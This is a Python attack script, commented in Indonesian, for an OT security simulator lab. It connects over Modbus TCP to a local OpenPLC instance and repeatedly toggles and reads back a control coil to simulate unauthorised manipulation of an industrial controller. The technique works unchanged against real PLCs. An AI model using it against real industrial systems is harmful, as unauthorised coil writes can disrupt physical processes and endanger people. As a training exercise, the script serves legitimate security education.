# plc_attacker.py
# Skenario Serangan Dasar untuk Tridente Labs - OT Security Simulator
# Pilar: Offense (PenTest+)
# Tujuan: Mensimulasikan akses ilegal dan manipulasi data di PLC.

import time
from pyModbusTCP.client import ModbusClient

# --- KONFIGURASI TARGET ---
# Kita serang PLC yang berjalan di dalam cluster kind,
# yang port-nya sudah kita forward ke localhost.
SERVER_HOST = "localhost"
SERVER_PORT = 30502

# --- INISIALISASI KONEKSI ---
# Buat koneksi ke Modbus TCP Server (OpenPLC kita)
# auto_open=True berarti koneksi akan dibuat saat perintah pertama dikirim.
try:
    c = ModbusClient(host=SERVER_HOST, port=SERVER_PORT, unit_id=1, auto_open=True)
    print(f"[*] Mencoba terhubung ke {SERVER_HOST}:{SERVER_PORT}...")
    if not c.is_open:
        c.open()
    
    if c.is_open:
        print("[+] Koneksi berhasil dibuat!")
    else:
        print("[-] Gagal membuat koneksi. Pastikan OpenPLC pod sudah berjalan.")
        exit()

except Exception as e:
    print(f"[-] Terjadi error koneksi: {e}")
    exit()

# --- LOOP SERANGAN ---
# Kita akan secara terus-menerus mengubah nilai sebuah coil (misal: tombol ON/OFF)
# lalu memverifikasi perubahannya.
bit_value = True
print("\n[*] Memulai siklus serangan...")

try:
    while True:
        # --- FASE 1: AKSI JAHAT (WRITE) ---
        # Tulis nilai (True/False) ke Coil nomor 1 (%QX0.1)
        print(f"\n[!] Menulis nilai '{bit_value}' ke Coil #1...")
        write_ok = c.write_single_coil(1, bit_value)

        if write_ok:
            print(f"[+] BERHASIL: Nilai Coil #1 diubah menjadi {bit_value}.")
        else:
            print("[-] GAGAL: Tidak dapat menulis ke Coil #1.")
        
        time.sleep(1)

        # --- FASE 2: VERIFIKASI (READ) ---
        # Baca kembali nilai dari Coil nomor 1 untuk konfirmasi.
        print("[*] Membaca kembali nilai untuk verifikasi...")
        read_bits = c.read_coils(1, 1)

        if read_bits:
            print(f"[+] Verifikasi BERHASIL: Nilai yang terbaca adalah {read_bits[0]}.")
            if read_bits[0] != bit_value:
                print("[!] PERINGATAN: Nilai yang terbaca tidak sesuai dengan yang ditulis!")
        else:
            print("[-] GAGAL: Tidak dapat membaca nilai dari Coil #1.")

        # Toggle nilai untuk serangan berikutnya
        bit_value = not bit_value
        print("\n--- Siklus selesai, menunggu 3 detik sebelum serangan berikutnya ---")
        time.sleep(3)

except KeyboardInterrupt:
    print("\n[!] Serangan dihentikan oleh pengguna.")
except Exception as e:
    print(f"\n[-] Terjadi error saat siklus serangan: {e}")
finally:
    print("[*] Menutup koneksi.")
    c.close()

